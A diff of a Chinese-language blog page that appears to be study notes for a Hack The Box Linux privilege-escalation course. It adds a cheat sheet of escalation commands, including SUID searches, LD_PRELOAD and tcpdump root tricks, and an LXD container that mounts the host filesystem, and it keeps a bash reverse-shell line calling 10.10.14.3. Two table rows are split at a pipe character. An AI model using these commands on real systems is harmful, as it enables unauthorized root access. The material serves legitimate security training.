@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#ffa2c4>
+                <a href="/tags/base" style=color:#03a9f4>
                     base
                 </a>
             </span>
@@ -752,6 +752,155 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
 <li><code>0&gt;&amp;1</code>：将标准输入重定向到与标准输出合并的输出流，实现双向通信。</li>
 </ul>
 </blockquote>
+<h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>备忘单是此模块的有用命令参考。</p>
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ssh htb-student@&lt;target IP&gt;</code></td>
+<td>通过 SSH 连接到实验室目标</td>
+</tr>
+<tr>
+<td>&#96;ps aux</td>
+<td>grep root&#96;</td>
+</tr>
+<tr>
+<td><code>ps au</code></td>
+<td>查看已登录的用户</td>
+</tr>
+<tr>
+<td><code>ls /home</code></td>
+<td>查看用户主目录</td>
+</tr>
+<tr>
+<td><code>ls -l ~/.ssh</code></td>
+<td>检查当前用户的 SSH 密钥</td>
+</tr>
+<tr>
+<td><code>history</code></td>
+<td>检查当前用户的 Bash 历史记录</td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>用户可以以其他用户的身份运行任何内容吗？</td>
+</tr>
+<tr>
+<td><code>ls -la /etc/cron.daily</code></td>
+<td>检查每日 Cron 作业</td>
+</tr>
+<tr>
+<td><code>lsblk</code></td>
+<td>检查未挂载的文件系统&#x2F;驱动器</td>
+</tr>
+<tr>
+<td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td>
+<td>查找全局可写目录</td>
+</tr>
+<tr>
+<td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td>
+<td>查找全局可写文件</td>
+</tr>
+<tr>
+<td><code>uname -a</code></td>
+<td>检查内核版本</td>
+</tr>
+<tr>
+<td><code>cat /etc/lsb-release</code></td>
+<td>检查操作系统版本</td>
+</tr>
+<tr>
+<td><code>gcc kernel_expoit.c -o kernel_expoit</code></td>
+<td>编译用 C 编写的漏洞利用</td>
+</tr>
+<tr>
+<td><code>screen -v</code></td>
+<td>检查已安装的 版本<code>Screen</code></td>
+</tr>
+<tr>
+<td><code>./pspy64 -pf -i 1000</code></td>
+<td>查看正在运行的进程<code>pspy</code></td>
+</tr>
+<tr>
+<td><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td>
+<td>查找设置了 SUID 位的二进制文件</td>
+</tr>
+<tr>
+<td><code>find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td>
+<td>查找设置了 SETGID 位的二进制文件</td>
+</tr>
+<tr>
+<td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td>
+<td>私人与<code>tcpdump</code></td>
+</tr>
+<tr>
+<td><code>echo $PATH</code></td>
+<td>检查当前用户的 PATH 变量内容</td>
+</tr>
+<tr>
+<td><code>PATH=.:$&#123;PATH&#125;</code></td>
+<td>在当前用户的 PATH 开头添加<code>.</code></td>
+</tr>
+<tr>
+<td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td>
+<td>搜索配置文件</td>
+</tr>
+<tr>
+<td><code>ldd /bin/ls</code></td>
+<td>查看二进制文件所需的共享对象</td>
+</tr>
+<tr>
+<td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td>
+<td>使用 提升权限<code>LD_PRELOAD</code></td>
+</tr>
+<tr>
+<td>&#96;readelf -d payroll</td>
+<td>grep PATH&#96;</td>
+</tr>
+<tr>
+<td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td>
+<td>编译共享库</td>
+</tr>
+<tr>
+<td><code>lxd init</code></td>
+<td>启动 LXD 初始化过程</td>
+</tr>
+<tr>
+<td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td>
+<td>导入本地镜像</td>
+</tr>
+<tr>
+<td><code>lxc init alpine r00t -c security.privileged=true</code></td>
+<td>启动特权 LXD 容器</td>
+</tr>
+<tr>
+<td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td>
+<td>在容器中挂载主机文件系统</td>
+</tr>
+<tr>
+<td><code>lxc start r00t</code></td>
+<td>启动容器</td>
+</tr>
+<tr>
+<td><code>showmount -e 10.129.2.12</code></td>
+<td>显示 NFS 导出列表</td>
+</tr>
+<tr>
+<td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
+<td>在本地挂载 NFS 共享</td>
+</tr>
+<tr>
+<td><code>tmux -S /shareds new -s debugsess</code></td>
+<td>已创建共享会话套接字<code>tmux</code></td>
+</tr>
+<tr>
+<td><code>./lynis audit system</code></td>
+<td>使用 执行系统审核<code>Lynis</code></td>
+</tr>
+</tbody></table>
 
     </div>
 
